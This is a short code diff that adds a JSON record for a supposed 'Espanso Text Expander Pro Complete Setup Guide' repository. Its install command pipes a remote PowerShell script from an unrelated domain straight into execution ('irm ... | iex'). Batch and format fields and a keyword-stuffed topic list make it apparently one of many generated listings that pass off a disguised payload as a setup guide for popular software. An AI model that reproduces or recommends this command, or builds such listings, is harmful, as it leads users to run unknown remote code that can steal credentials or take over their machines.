@@ -1,0 +1,25 @@
+{
+  "repo": "Espanso-Text-Expander-Pro-Complete-Setup-Guide",
+  "product": "Espanso Text Expander Pro Complete Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "espanso-text-expander-pro-complete-setup",
+    "espanso",
+    "text",
+    "expander",
+    "pro",
+    "complete",
+    "setup",
+    "utility",
+    "windows",
+    "desktop",
+    "setup-guide",
+    "software"
+  ]
+}
